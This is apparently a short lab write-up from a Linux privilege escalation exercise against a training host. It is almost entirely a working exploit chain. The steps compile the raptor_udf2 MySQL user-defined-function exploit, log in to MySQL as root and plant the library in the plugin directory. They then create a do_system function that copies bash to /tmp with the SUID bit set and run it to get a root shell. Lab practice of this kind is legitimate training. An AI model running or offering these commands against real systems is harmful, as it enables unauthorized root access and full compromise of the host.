# Basic Linux Privilege Escalation .

### IP 10.10.111.117


##  1. Service Exploits:

My sql service udf function Exploit 

- Compiling the exploit 

        gcc -g -c raptor_udf2.c -fPIC
        gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc



- Connecting root user

        mysql -u root


- Executing  commands on the MySQL shell to create a User Defined Function (UDF) "do_system" using  compiled exploit

    use mysql;
    create table foo(line blob);
    insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
    select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
    create function do_system returns integer soname 'raptor_udf2.so';


- coping /bin/bash to /tmp/rootbash and set the SUID permission

        select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');

- running executable to gain root access
 
        /tmp/rootbash -p


